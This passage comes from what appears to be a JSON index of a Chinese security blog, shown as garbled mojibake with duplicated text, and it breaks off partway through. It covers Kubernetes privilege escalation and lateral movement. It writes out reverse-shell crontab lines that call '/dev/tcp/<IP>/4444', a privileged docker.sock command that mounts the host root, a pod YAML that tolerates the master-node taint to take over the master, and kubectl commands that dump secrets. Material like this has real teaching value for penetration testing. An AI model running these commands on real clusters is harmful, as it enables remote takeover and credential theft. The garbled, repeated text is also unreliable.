ä¸æ”¯æŒ\u0026gt;\u0026amp;è¯­æ³•ï¼Œä¸Šé¢çš„yamlæ–‡ä»¶ä¸­åå¼¹shellçš„payloadåŒç†\næˆ‘åœ¨k3sç¯å¢ƒé‡åˆ°ä¸€ä¸ªé—®é¢˜ï¼Œåœ¨æ”¶åˆ°åå¼¹shellåä¼šç«‹åˆ»è‡ªåŠ¨exitæˆ–è€…é€€å‡ºï¼š\nè¿™é‡Œå…¶å®å¯ä»¥å·æ‡’ç›´æ¥chrootä¸€ä¸‹ä¹Ÿè¡Œï¼Œä½†æ˜¯è¿™æ ·åªèƒ½ä»¥é«˜æƒé™è¿›è¡Œæ–‡ä»¶ç›¸å…³æ“ä½œï¼š ä¸è¿‡é€šè¿‡æŸ¥é˜…èµ„æ–™å‘ç°åŸå› å¯èƒ½å’Œbusyboxçš„æƒ…å†µç±»ä¼¼ï¼Œå¯¹-iå³äº¤äº’å‚æ•°æ”¯æŒä¸å®Œæ•´ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å°è¯•ä½¿ç”¨disownå‘½ä»¤è®©æˆ‘ä»¬åå¼¹shellçš„è¿›ç¨‹ä¸å—çˆ¶shellè¿›ç¨‹å½±å“è€Œexitï¼š\necho -e \u0026#34;* * * * * root /bin/bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/\u0026lt;IP\u0026gt;/4444 0\u0026gt;\u0026amp;1 \u0026amp; disown\u0026#39;\u0026#34; \u0026gt;\u0026gt; /mnt/etc/crontab æ­¤æ—¶æˆ‘ä»¬å°±å¯ä»¥æ¥æ”¶åˆ°åå¼¹çš„shellå¹¶ä¸”ä¸ä¼šæ–­å¼€äº†ï¼š æŒä¹…åŒ–æŒ‚è½½docker.sock æŒ‚è½½docker socketé€ƒé€¸åŒæ ·åœ¨æˆ‘å†™çš„ Dockeré€ƒé€¸æ‰‹æ³•å¤§å…¨ ä¸­è¯¦ç»†ä»‹ç»äº†ï¼Œå€¼å¾—ä¸€æçš„æ˜¯ï¼Œå¦‚æœå·²ç»è·å–äº†æ­¤ç±»å®¹å™¨çš„ full tty shell, å¯ä»¥ç”¨ç±»ä¼¼ä¸‹è¿°çš„å‘½ä»¤åˆ›å»ºä¸€ä¸ªé€šå¾€å®¿ä¸»æœºçš„ shellï¼š\n./bin/docker -H unix:///tmp/rootfs/var/run/docker.sock run -d -it --rm --name rshell -v \u0026#34;/proc:/host/proc\u0026#34; -v \u0026#34;/sys:/host/sys\u0026#34; -v \u0026#34;/:/rootfs\u0026#34; --network=host --privileged=true --cap-add=ALL alpine:latest å®¹å™¨ç‰¹æƒé€ƒé€¸ åŒæ ·åœ¨ Dockeré€ƒé€¸æ‰‹æ³•å¤§å…¨ é‡Œè¯¦ç»†ä»‹ç»äº†ï¼Œå€¼å¾—ä¸€é¢˜çš„æ˜¯å…³äºç‰¹æƒä¿¡æ¯æœé›†æ—¶çš„å°æŠ€å·§ï¼Œåœ¨æˆ‘è¿™ç¯‡ç¬”è®°ä¸­æœ‰è®°å½•ï¼šK8sæ¸—é€-ä¿¡æ¯æœé›†\nå®¹å™¨åŸºç¡€åº”ç”¨æˆ–å®¹å™¨ç¼–æ’å¹³å°æ¼æ´ dockeræ¼æ´ å³dockeré€ƒé€¸çš„ä¸€äº›å†å²CVEï¼ŒåŸºæœ¬å’Œdockerçš„runcã€containerdç­‰å®¹å™¨ç›¸å…³\nk8sæ¼æ´ å³k8så®¹å™¨é€ƒé€¸çš„ä¸€äº›å†å²CVE\nåˆ©ç”¨linuxå†…æ ¸æ¼æ´é€ƒé€¸ è¿™ä¸ªåŸç†åœ¨dockeré€ƒé€¸çš„æ–‡ç« ä¹Ÿè§£é‡Šäº†ï¼Œå°±æ˜¯å®¹å™¨ä¸å®¿ä¸»æœºå…±äº«å†…æ ¸å¹¶ä½¿ç”¨å†…æ ¸åŠŸèƒ½ï¼ˆæ¯”å¦‚cgroupå’Œnamespaceï¼‰è¿›è¡Œå®¹å™¨å’Œå®¿ä¸»æœºçš„éš”ç¦»ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å†…æ ¸ææƒæ¼æ´æ¥è¿›è¡Œé€ƒé€¸ï¼Œå¸¸è§å¦‚ä¸‹ï¼š\nCVE-2016-5195 DirtyCowï¼šæ‰§è¡Œ uname -rï¼Œ2.6.22\u0026lt;=å†…æ ¸ç‰ˆæœ¬\u0026lt;=4.8.3æ—¶å¯èƒ½å­˜åœ¨ CVE-2020-14386ï¼š4.6\u0026lt;=å†…æ ¸ç‰ˆæœ¬\u0026lt;=5.9æ—¶å¯èƒ½å­˜åœ¨ CVE-2022-0847ï¼šå†…æ ¸ç‰ˆæœ¬å°äº5.16.11ä¸”ä¸æ˜¯5.15.25ã€5.10.102æ—¶å¯èƒ½å­˜åœ¨ æ€»ç»“ å¯ä»¥çœ‹è§k8sä¸­æƒé™æå‡çš„å¸¸è§æ–¹æ³•å°±æ˜¯æƒé™æ»¥ç”¨æˆ–å®¹å™¨é€ƒé€¸\n",
        "summary": "K8sæ¸—é€-æƒé™æå‡ æ–‡ç« é¦–å‘äºtrackå®‰å…¨ç¤¾åŒºï¼šK8sæ¸—é€å…¥é—¨ä»é›¶åˆ°ä¸€\nä¸€èˆ¬æ¥è¯´ï¼Œåœ¨k8sä¸­çš„ææƒå°±æ˜¯å°è¯•ä»podå®¹å™¨è·å–åˆ°å¯¹nodeèŠ‚ç‚¹çš„æ§åˆ¶æƒï¼Œç”šè‡³è·å–å¯¹äº‘èµ„æºçš„è®¿é—®æƒé™ã€‚\nRBACæƒé™æ»¥ç”¨ ç±»ä¼¼äºæˆ‘ä»¬åœ¨æ‰§è¡Œä¸­æåˆ°çš„æ‰“æ³•ï¼Œå°±æ˜¯è·å–podä¸­é«˜æƒé™ï¼ˆæ¯”å¦‚ç»‘å®šåˆ°cluster-adminç”¨æˆ·ç»„ï¼‰çš„serviceaccountï¼Œç„¶åå†è°ƒç”¨apiserverå®ç°é€ƒé€¸ï¼Œç„¶è€Œé™¤äº†cluster-adminï¼Œå¾ˆå¤šå‡­è¯ä¹Ÿæ˜¯å¯ä»¥æƒé™æå‡åˆ°cluster-adminçš„ï¼Œæˆ‘ä»¬å¯ä»¥é‡ç‚¹å…³æ³¨Helmã€Ciliumã€Nginx Ingressã€Prometheusç­‰æœåŠ¡\néƒ¨ç½²é™æ€pod è¿™ä¸ªæ–¹æ³•åœ¨æˆ‘çš„k8sæ¸—é€-æŒä¹…åŒ–çš„ç¬”è®°ä¸­å·²ç»ä»‹ç»è¿‡äº†ï¼Œè¿™é‡Œä¸å†èµ˜è¿°\nåˆ©ç”¨å®¹å™¨ä¸å®‰å…¨é…ç½®ææƒ å³å®¹å™¨é€ƒé€¸ï¼Œè¿™é‡Œçš„å¾ˆå¤štrickså…¶å®å’Œdockeré€ƒé€¸æ²¡æœ‰å¾ˆå¤§åŒºåˆ«\næŒ‚è½½ç›®å½•é€ƒé€¸ æŒ‚è½½çš„æ–¹æ³•å¾ˆå¤šï¼Œä¾‹å¦‚æŒ‚è½½æ ¹ç›®å½•ã€æŒ‚è½½pocfsã€æŒ‚è½½/etcã€æŒ‚è½½cgroupã€æŒ‚è½½/var/logç­‰ç­‰ï¼Œå¯ä»¥ç›´æ¥çœ‹æˆ‘çš„è¿™ç¯‡æ–‡ç« ï¼šDockeré€ƒé€¸æ‰‹æ³•å¤§å…¨ï¼Œè¿™é‡Œæä¸€ä¸ªæœ€ç®€å•çš„æŒ‚è½½æ ¹ç›®å½•ï¼š\næ¯”å¦‚æˆ‘ä»¬åˆ›å»ºæ¶æ„podçš„æ—¶å€™ï¼Œæ ¹ç›®å½•æŒ‚è½½åˆ°äº†å®¹å™¨çš„/mntç›®å½•ï¼Œæ‰€ä»¥åœ¨è·å–äº†podçš„shellåï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æŸ¥çœ‹podçš„/mntç›®å½•æ¥è®¿é—®æŸ¥çœ‹nodeçš„æ ¹ç›®å½•ï¼š\næ¥ä¸‹æ¥å¯ä»¥é€šè¿‡å†™å®šæ—¶ä»»åŠ¡æ¥è·å–nodeçš„shellï¼š\necho -e \u0026#34;* * * * * root /bin/bash -c \u0026#39;sh -i \u0026gt;\u0026amp; /dev/tcp/\u0026lt;vpsçš„å…¬ç½‘IP\u0026gt;/4444 0\u0026gt;\u0026amp;1 \u0026amp; disown \u0026#39;\u0026#34; \u0026gt;\u0026gt; /mnt/etc/crontab æ³¨æ„ï¼Œè¿™é‡Œå¹¶æ²¡æœ‰ç›´æ¥ä½¿ç”¨sh -i \u0026gt; /dev/tcp/\u0026lt;IP\u0026gt;/4444 2\u0026gt;\u0026amp;1ï¼Œå› ä¸ºcron é»˜è®¤ä½¿ç”¨çš„æ˜¯ /bin/shï¼Œè€Œä¸æ˜¯ bashï¼Œsh ä¸æ”¯æŒ\u0026gt;\u0026amp;è¯­æ³•ï¼Œä¸Šé¢çš„yamlæ–‡ä»¶ä¸­åå¼¹shellçš„payloadåŒç†\næˆ‘åœ¨k3sç¯å¢ƒé‡åˆ°ä¸€ä¸ªé—®é¢˜ï¼Œåœ¨æ”¶åˆ°åå¼¹shellåä¼šç«‹åˆ»è‡ªåŠ¨exitæˆ–è€…é€€å‡ºï¼š\nè¿™é‡Œå…¶å®å¯ä»¥å·æ‡’ç›´æ¥chrootä¸€ä¸‹ä¹Ÿè¡Œï¼Œä½†æ˜¯è¿™æ ·åªèƒ½ä»¥é«˜æƒé™è¿›è¡Œæ–‡ä»¶ç›¸å…³æ“ä½œï¼š ä¸è¿‡é€šè¿‡æŸ¥é˜…èµ„æ–™å‘ç°åŸå› å¯èƒ½å’Œbusyboxçš„æƒ…å†µç±»ä¼¼ï¼Œå¯¹-iå³äº¤äº’å‚æ•°æ”¯æŒä¸å®Œæ•´ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å°è¯•ä½¿ç”¨disownå‘½ä»¤è®©æˆ‘ä»¬åå¼¹shellçš„è¿›ç¨‹ä¸å—çˆ¶shellè¿›ç¨‹å½±å“è€Œexitï¼š\necho -e \u0026#34;* * * * * root /bin/bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/\u0026lt;IP\u0026gt;/4444 0\u0026gt;\u0026amp;1 \u0026amp; disown\u0026#39;\u0026#34; \u0026gt;\u0026gt; /mnt/etc/crontab æ­¤æ—¶æˆ‘ä»¬å°±å¯ä»¥æ¥æ”¶åˆ°åå¼¹çš„shellå¹¶ä¸”ä¸ä¼šæ–­å¼€äº†ï¼š æŒä¹…åŒ–æŒ‚è½½docker.sock æŒ‚è½½docker socketé€ƒé€¸åŒæ ·åœ¨æˆ‘å†™çš„ Dockeré€ƒé€¸æ‰‹æ³•å¤§å…¨ ä¸­è¯¦ç»†ä»‹ç»äº†ï¼Œå€¼å¾—ä¸€æçš„æ˜¯ï¼Œå¦‚æœå·²ç»è·å–äº†æ­¤ç±»å®¹å™¨çš„ full tty shell, å¯ä»¥ç”¨ç±»ä¼¼ä¸‹è¿°çš„å‘½ä»¤åˆ›å»ºä¸€ä¸ªé€šå¾€å®¿ä¸»æœºçš„ shellï¼š\n"
    }
,
    {
        "title": "k8sæ¸—é€-æ¨ªå‘ç§»åŠ¨",
        "link": "/My-Knowlege-Database/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/k8s%E6%B8%97%E9%80%8F-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/",
        "content": "k8sæ¸—é€-æ¨ªå‘ç§»åŠ¨ çªƒå–å‡­è¯ kubeconfigå‡­è¯ kubeconfigæ–‡ä»¶é€šå¸¸å‡ºç°åœ¨è¿ç»´PCã€å†…ç½‘è·³æ¿æœºã€å ¡å’æœºã€masterèŠ‚ç‚¹ç­‰æœºå™¨ä¸Šï¼Œkubeconfigæ–‡ä»¶çš„ä½¿ç”¨åœ¨æˆ‘çš„ k8sæ¸—é€-åˆå§‹è®¿é—® ç¬”è®°ä¸­å·²ç»ä»‹ç»äº†ï¼Œè¿™é‡Œä¸å†è¯´æ˜\nsecretå¯¹è±¡ åœ¨k8sä¸­ï¼Œsecretå¯¹è±¡ç”¨äºå­˜å‚¨å¯†ç ã€OAuthä»¤ç‰Œã€sshå¯†é’¥ç­‰æ•æ„Ÿä¿¡æ¯ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•ä»ä¸­çªƒå–å…¶ä»–æœåŠ¡çš„é€šä¿¡å‡­è¯ï¼š\nkubeconfig get secrets -A æŸ¥çœ‹æŒ‡å®šsecretå†…å®¹ï¼š\nkubectl --kubeconfig config -n [æŒ‡å®šå‘½åç©ºé—´] get secret [secretåç§°] -o yaml å¯æƒœè¿™é‡Œæ¡ˆä¾‹ä¸Šæ˜¯hashï¼Œå¦‚æœæ˜¯ç¡¬ç¼–ç åœ¨secretä¸­ï¼Œå°±å¯ä»¥è§£ç è·å–æ˜æ–‡å¯†ç äº†\né›†ç¾¤å†…ç½‘æ¸—é€ K8sé»˜è®¤å…è®¸é›†ç¾¤å†…éƒ¨çš„podå’Œserviceç›´æ¥é€šä¿¡ï¼Œåœ¨æ²¡æœ‰NetworkPolicy / eBPFé™åˆ¶çš„æƒ…å†µä¸‹ï¼Œæ— è®ºæ˜¯nodeè¿˜æ˜¯podï¼Œå†…ç½‘çš„é€šä¿¡å’Œå¸¸è§„å†…ç½‘æ¸—é€çš„æƒ…å†µåŸºæœ¬æ— å·®å¼‚ï¼Œæˆ‘ä»¬ä»ç„¶å¯ä»¥ä½¿ç”¨nmapã€masscanã€fscanç­‰æ‰«æå·¥å…·è¿›è¡Œå†…ç½‘æ¢ç´¢ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å¸¸è§„å†…ç½‘çš„æ¨ªå‘ç§»åŠ¨æ‰‹æ®µ\nç¬¬ä¸‰æ–¹ç»„ä»¶é£é™© åœ¨å¾ˆå¤šk8sçš„é…ç½®æ•™ç¨‹ä¸­ä¼šå­˜åœ¨ä¸€äº›å¿½ç•¥çœŸå®ç¯å¢ƒå®‰å…¨é—®é¢˜çš„æƒ…å†µï¼Œå¯¼è‡´ä¸€äº›æ’ä»¶/æœåŠ¡å­˜åœ¨æœªæˆæƒçš„æƒ…å†µï¼Œç”šè‡³æ˜¯æœåŠ¡è´¦å·å…·æœ‰é«˜æƒé™ï¼ŒåŸºäºè¿™äº›æƒ…å†µï¼Œæˆ‘ä»¬å¯ä»¥å…³æ³¨ä¸€äº›å¸¸è§çš„æœåŠ¡è´¦å·æ¯”å¦‚helmã€ciliumã€Nginx Ingressã€Prometheusï¼Œæ¯”å¦‚helm v2ç‰ˆæœ¬é»˜è®¤å­˜åœ¨é«˜æƒé™è´¦å·ï¼Œé‚£ä¹ˆå¯ä»¥åˆ©ç”¨é«˜æƒé™ç»™è‡ªå·±èµ‹äºˆcluster-adminè¿›è€Œææƒé€ƒé€¸\nç®€è€Œè¨€ä¹‹ï¼Œæˆ‘ä»¬çš„æ€è·¯å¯ä»¥æ˜¯ï¼šè¿›å…¥podï¼Œé€šè¿‡æ¼æ´/æœªæˆæƒæ”»å‡»ç¬¬ä¸‰æ–¹ç»„ä»¶ï¼Œåˆ©ç”¨ç»„ä»¶çš„ä¸å½“æƒé™æ“ä½œk8sé›†ç¾¤\næ±¡ç‚¹ï¼ˆtaintï¼‰æ¨ªå‘ è¿™ä¸ªæ–¹æ³•è¾ƒä¸ºé¸¡è‚‹ï¼ŒåŸå› æ˜¯k8sæ±¡ç‚¹æ¨ªå‘éœ€è¦é…åˆä¸€äº›æ¼æ´ï¼Œè€Œè¿™äº›é…åˆæ¼æ´å¾€å¾€å¯ä»¥å•ç‹¬æ‹¿åˆ°æƒé™\næ±¡ç‚¹æ˜¯k8sé«˜çº§è°ƒåº¦çš„ç‰¹æ€§ï¼Œç”¨äºé™åˆ¶å“ªäº›podèƒ½è¢«è°ƒåº¦åˆ°æŸä¸€èŠ‚ç‚¹ä¸Š\nå…¶ä¸­æ±¡ç‚¹æœ‰ä¸‰ç§å±æ€§(æ•ˆæœ)ï¼š\nNoScheduleï¼šè¿™æ˜¯æœ€å¸¸è§çš„ç±»å‹ï¼Œè¡¨ç¤ºä¸å…è®¸ Pod è¢«è‡ªåŠ¨è°ƒåº¦åˆ°å¸¦æœ‰æ­¤æ±¡ç‚¹çš„èŠ‚ç‚¹ä¸Šã€‚åªæœ‰å½“ Pod å…·æœ‰ä¸æ±¡ç‚¹åŒ¹é…çš„å®¹å¿åº¦æ—¶ï¼Œæ‰èƒ½åœ¨è¿™äº›èŠ‚ç‚¹ä¸Šè°ƒåº¦ Podã€‚ PreferNoScheduleï¼šè¿™ç§ç±»å‹è¡¨ç¤ºä¸æ¨èä½†å…è®¸ Pod è¢«è°ƒåº¦åˆ°å¸¦æœ‰æ­¤æ±¡ç‚¹çš„èŠ‚ç‚¹ä¸Šã€‚å³ä½¿èŠ‚ç‚¹ä¸Šè®¾ç½®äº† PreferNoSchedule æ±¡ç‚¹ï¼Œå¦‚æœæ²¡æœ‰å…¶ä»–æ›´é€‚åˆçš„èŠ‚ç‚¹ï¼ŒPod ä»ç„¶å¯ä»¥è¢«è°ƒåº¦åˆ°è¿™äº›èŠ‚ç‚¹ä¸Šã€‚ NoExecuteï¼šè¿™ç§ç±»å‹è¡¨ç¤ºèŠ‚ç‚¹ä¸Šçš„Podä¼šè¢«é©±é€ï¼ˆEvictionï¼‰ï¼Œå³ä½¿å®ƒä»¬å·²ç»è¿è¡Œåœ¨è¯¥èŠ‚ç‚¹ä¸Šã€‚é€šå¸¸ï¼ŒNoExecute æ±¡ç‚¹ä¼šå¯¼è‡´ Pod è¢«ç»ˆæ­¢å¹¶è¿ç§»åˆ°å…¶ä»–èŠ‚ç‚¹ã€‚ ä¸€èˆ¬æ¥è¯´masterèŠ‚ç‚¹åŒ…å«ä¸€ä¸ªæ±¡ç‚¹ï¼Œè€Œè¿™ä¸ªæ±¡ç‚¹é€šå¸¸ç”¨äºé˜»æ­¢podè°ƒåº¦åˆ°ä¸»èŠ‚ç‚¹ä¸Šï¼Œé™¤épodèƒ½å®¹å¿è¯¥æ±¡ç‚¹ï¼ˆé€šå¸¸å®¹å¿è¿™ä¸ªæ±¡ç‚¹çš„podéƒ½æ˜¯ç³»ç»Ÿçº§ï¼Œåˆ«æ¯”å¦‚kube-systemå‘½åç©ºé—´ä¸‹çš„podï¼‰ï¼Œåœ¨æ™®é€šèŠ‚ç‚¹æ¨ªå‘æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ±¡ç‚¹å®¹å¿åº¦åˆ›å»ºæ¶æ„podå°è¯•æ¨ªå‘åˆ°ä¸»èŠ‚ç‚¹\næ¯”å¦‚ï¼šè·å–workerèŠ‚ç‚¹æƒé™ï¼Œåˆ›å»ºé…ç½®äº†ä¸masterèŠ‚ç‚¹æ±¡ç‚¹å¯¹åº”å®¹å¿åº¦çš„æ¶æ„nodeï¼Œyamlå¦‚ä¸‹ï¼š\ncat \u0026gt; x.yaml \u0026lt;\u0026lt; EOF apiVersion: v1 kind: Pod metadata: name: control-master-x spec: tolerations: - key: \u0026#34;node-role.kubernetes.io/master\u0026#34; operator: \u0026#34;Exists\u0026#34; effect: \u0026#34;NoSchedule\u0026#34; containers: - name: control-master-x image: ubuntu:18.04 command: [\u0026#34;/bin/sleep\u0026#34;, \u0026#34;3650d\u0026#34;] volumeMounts: - name: master mountPath: /master volumes: - name: master hostPath: path: / type: Directory EOF è¿™æ ·createçš„podå…è®¸è¢«è°ƒåº¦åˆ°ä¸»èŠ‚ç‚¹ï¼Œè¿™é‡Œå¤šæ¬¡å°è¯•åˆ›å»ºå°±æœ‰æœºä¼šåˆ›å»ºåˆ°masterèŠ‚ç‚¹ï¼Œè¿›è€Œé€ƒé€¸æ¥ç®¡masterèŠ‚ç‚¹\nå…¶ä»–æ¨ªå‘ ä¹‹å‰ç¬”è®°ä¸­æåˆ°çš„æƒé™æå‡é˜¶æ®µçš„é€ƒé€¸æ‰‹æ³•ä¹Ÿèƒ½ç”¨äºæ¨ªå‘ç§»åŠ¨ï¼Œå¦å¤–ï¼Œåœ¨é«˜æƒé™æƒ…å†µä¸‹æ¥ç®¡dashboardä¹Ÿèƒ½ç›´æ¥åœ¨é¢æ¿ä¸‹å‘æŒ‡ä»¤ï¼Œå®ç°æ¨ªå‘\næ€»ç»“ å¯ä»¥çœ‹åˆ°k8sçš„æ¨ªå‘æ–¹å¼éƒ½æ˜¯æ¢æ±¤ä¸æ¢è¯ï¼Œæ— éåŸºäºæœåŠ¡ã€å‡­è¯ã€é€ƒé€¸ã€å¸¸è§„å†…ç½‘æ¨ªå‘ï¼Œå¾ˆå¤šé—®é¢˜éƒ½æ˜¯ç®¡ç†å‘˜é…ç½®ä¸å½“äº§ç”Ÿ\n",
        "summary": "k8sæ¸—é€-æ¨ªå‘ç§»åŠ¨ çªƒå–å‡­è¯ kubeconfigå‡­è¯ kubeconfigæ–‡ä»¶é€šå¸¸å‡ºç°åœ¨è¿ç»´PCã€å†…ç½‘è·³æ¿æœºã€å ¡å’æœºã€masterèŠ‚ç‚¹ç­‰æœºå™¨ä¸Šï¼Œkubeconfigæ–‡ä»¶çš„ä½¿ç”¨åœ¨æˆ‘çš„ k8sæ¸—é€-åˆå§‹è®¿é—® ç¬”è®°ä¸­å·²ç»ä»‹ç»äº†ï¼Œè¿™é‡Œä¸å†è¯´æ˜\nsecretå¯¹è±¡ åœ¨k8sä¸­ï¼Œsecretå¯¹è±¡ç”¨äºå­˜å‚¨å¯†ç ã€OAuthä»¤ç‰Œã€sshå¯†é’¥ç­‰æ•æ„Ÿä¿¡æ¯ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•ä»ä¸­çªƒå–å…¶ä»–æœåŠ¡çš„é€šä¿¡å‡­è¯ï¼š\nkubeconfig get secrets -A æŸ¥çœ‹æŒ‡å®šsecretå†…å®¹ï¼š\nkubectl --kubeconfig config -n [æŒ‡å®šå‘½åç©ºé—´] get secret [secretåç§°] -o yaml å¯æƒœè¿™é‡Œæ¡ˆä¾‹ä¸Šæ˜¯hashï¼Œå¦‚æœæ˜¯ç¡¬ç¼–ç åœ¨secretä¸­ï¼Œå°±å¯ä»¥è§£ç è·å–æ˜æ–‡å¯†ç äº†\né›†ç¾¤å†…ç½‘æ¸—é€ K8sé»˜è®¤å…è®¸é›†ç¾¤å†…éƒ¨çš„podå’Œserviceç›´æ¥é€šä¿¡ï¼Œåœ¨æ²¡æœ‰NetworkPolicy / eBPFé™åˆ¶çš„æƒ…å†µä¸‹ï¼Œæ— è®ºæ˜¯nodeè¿˜æ˜¯podï¼Œå†…ç½‘çš„é€šä¿¡å’Œå¸¸è§„å†…ç½‘æ¸—é€çš„æƒ…å†µåŸºæœ¬æ— å·®å¼‚ï¼Œæˆ‘ä»¬ä»ç„¶å¯ä»¥ä½¿ç”¨nmapã€masscanã€fscanç­‰æ‰«æå·¥å…·è¿›è¡Œå†…ç½‘æ¢ç´¢ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å¸¸è§„å†…ç½‘çš„æ¨ªå‘ç§»åŠ¨æ‰‹æ®µ\nç¬¬ä¸‰æ–¹ç»„ä»¶é£é™© åœ¨å¾ˆå¤šk8sçš„é…ç½®æ•™ç¨‹ä¸­ä¼šå­˜åœ¨ä¸€äº›å¿½ç•¥çœŸå®ç¯å¢ƒå®‰å…¨é—®é¢˜çš„æƒ…å†µï¼Œå¯¼è‡´ä¸€äº›æ’ä»¶/æœåŠ¡å­˜åœ¨æœªæˆæƒçš„æƒ…å†µï¼Œç”šè‡³æ˜¯æœåŠ¡è´¦å·å…·æœ‰é«˜æƒé™ï¼ŒåŸºäºè¿™äº›æƒ…å†µï¼Œæˆ‘ä»¬å¯ä»¥å…³æ³¨ä¸€äº›å¸¸è§çš„æœåŠ¡è´¦å·æ¯”å¦‚helmã€ciliumã€Nginx Ingressã€Prometheusï¼Œæ¯”å¦‚helm v2ç‰ˆæœ¬é»˜è®¤å­˜åœ¨é«˜æƒé™è´¦å·ï¼Œé‚£ä¹ˆå¯ä»¥åˆ©ç”¨é«˜æƒé™ç»™è‡ªå·±èµ‹äºˆcluster-adminè¿›è€Œææƒé€ƒé€¸\nç®€è€Œè¨€ä¹‹ï¼Œæˆ‘ä»¬çš„æ€è·¯å¯ä»¥æ˜¯ï¼šè¿›å…¥podï¼Œé€šè¿‡æ¼æ´/æœªæˆæƒæ”»å‡»ç¬¬ä¸‰æ–¹ç»„ä»¶ï¼Œåˆ©ç”¨ç»„ä»¶çš„ä¸å½“æƒé™æ“ä½œk8sé›†ç¾¤\næ±¡ç‚¹ï¼ˆtaintï¼‰æ¨ªå‘ è¿™ä¸ªæ–¹æ³•è¾ƒä¸ºé¸¡è‚‹ï¼ŒåŸå› æ˜¯k8sæ±¡ç‚¹æ¨ªå‘éœ€è¦é…åˆä¸€äº›æ¼æ´ï¼Œè€Œè¿™äº›é…åˆæ¼æ´å¾€å¾€å¯ä»¥å•ç‹¬æ‹¿åˆ°æƒé™\næ±¡ç‚¹æ˜¯k8sé«˜çº§è°ƒåº¦çš„ç‰¹æ€§ï¼Œç”¨äºé™åˆ¶å“ªäº›podèƒ½è¢«è°ƒåº¦åˆ°æŸä¸€èŠ‚ç‚¹ä¸Š\nå…¶ä¸­æ±¡ç‚¹æœ‰ä¸‰ç§å±æ€§(æ•ˆæœ)ï¼š\nNoScheduleï¼šè¿™æ˜¯æœ€å¸¸è§çš„ç±»å‹ï¼Œè¡¨ç¤ºä¸å…è®¸ Pod è¢«è‡ªåŠ¨è°ƒåº¦åˆ°å¸¦æœ‰æ­¤æ±¡ç‚¹çš„èŠ‚ç‚¹ä¸Šã€‚åªæœ‰å½“ Pod å…·æœ‰ä¸æ±¡ç‚¹åŒ¹é…çš„å®¹å¿åº¦æ—¶ï¼Œæ‰èƒ½åœ¨è¿™äº›èŠ‚ç‚¹ä¸Šè°ƒåº¦ Podã€‚ PreferNoScheduleï¼šè¿™ç§ç±»å‹è¡¨ç¤ºä¸æ¨èä½†å…è®¸ Pod è¢«è°ƒåº¦åˆ°å¸¦æœ‰æ­¤æ±¡ç‚¹çš„èŠ‚ç‚¹ä¸Šã€‚å³ä½¿èŠ‚ç‚¹ä¸Šè®¾ç½®äº† PreferNoSchedule æ±¡ç‚¹ï¼Œå¦‚æœæ²¡æœ‰å…¶ä»–æ›´é€‚åˆçš„èŠ‚ç‚¹ï¼ŒPod ä»ç„¶å¯ä»¥è¢«è°ƒåº¦åˆ°è¿™äº›èŠ‚ç‚¹ä¸Šã€‚ NoExecuteï¼šè¿™ç§ç±»å‹è¡¨ç¤ºèŠ‚ç‚¹ä¸Šçš„Podä¼šè¢«é©±é€ï¼ˆEvictionï¼‰ï¼Œå³ä½¿å®ƒä»¬å·²ç»è¿è¡Œåœ¨è¯¥èŠ‚ç‚¹ä¸Šã€‚é€šå¸¸ï¼ŒNoExecute æ±¡ç‚¹ä¼šå¯¼è‡´ Pod è¢«ç»ˆæ­¢å¹¶è¿ç§»åˆ°å…¶ä»–èŠ‚ç‚¹ã€‚ ä¸€èˆ¬æ¥è¯´masterèŠ‚ç‚¹åŒ…å«ä¸€ä¸ªæ±¡ç‚¹ï¼Œè€Œè¿™ä¸ªæ±¡ç‚¹é€šå¸¸ç”¨äºé˜»æ­¢podè°ƒåº¦åˆ°ä¸»èŠ‚ç‚¹ä¸Šï¼Œé™¤épodèƒ½å®¹å¿è¯¥æ±¡ç‚¹ï¼ˆé€šå¸¸å®¹å¿è¿™ä¸ªæ±¡ç‚¹çš„podéƒ½æ˜¯ç³»ç»Ÿçº§ï¼Œåˆ«æ¯”å¦‚kube-systemå‘½åç©ºé—´ä¸‹çš„podï¼‰ï¼Œåœ¨æ™®é€šèŠ‚ç‚¹æ¨ªå‘æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ±¡ç‚¹å®¹å¿åº¦åˆ›å»ºæ¶æ„podå°è¯•æ¨ªå‘åˆ°ä¸»èŠ‚ç‚¹\næ¯”å¦‚ï¼šè·å–workerèŠ‚ç‚¹æƒé™ï¼Œåˆ›å»ºé…ç½®äº†ä¸masterèŠ‚ç‚¹æ±¡ç‚¹å¯¹åº”å®¹å¿åº¦çš„æ¶æ„nodeï¼Œyamlå¦‚ä¸‹ï¼š\ncat \u0026gt; x.yaml \u0026lt;\u0026lt; EOF apiVersion: v1 kind: Pod metadata: name: control-master-x spec: tolerations: - key: \u0026#34;node-role.kubernetes.io/master\u0026#34; operator: \u0026#34;Exists\u0026#34; effect: \u0026#34;NoSchedule\u0026#34; containers: - name: control-master-x image: ubuntu:18.04 command: [\u0026#34;/bin/sleep\u0026#34;, \u0026#34;3650d\u0026#34;] volumeMounts: - name: master mountPath: /master volumes: - name: master hostPath: path: / type: Directory EOF è¿™æ ·createçš„podå…è®¸è¢«è°ƒåº¦åˆ°ä¸»èŠ‚ç‚¹ï¼Œè¿™é‡Œå¤šæ¬¡å°è¯•åˆ›å»ºå°±æœ‰æœºä¼šåˆ›å»ºåˆ°masterèŠ‚ç‚¹ï¼Œè¿›è€Œé€ƒé€¸æ¥ç®¡masterèŠ‚ç‚¹\n"
    }
,
    {
        "title": "kerberosæ”»å‡»ä¸“é¢˜",
        "link": "/My-Knowlege-Database/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows%E5%8D%8F%E8%AE%AE/kerberos%E6%94%BB%E5%87%BB%E4%B8%93%E9%A2%98/",
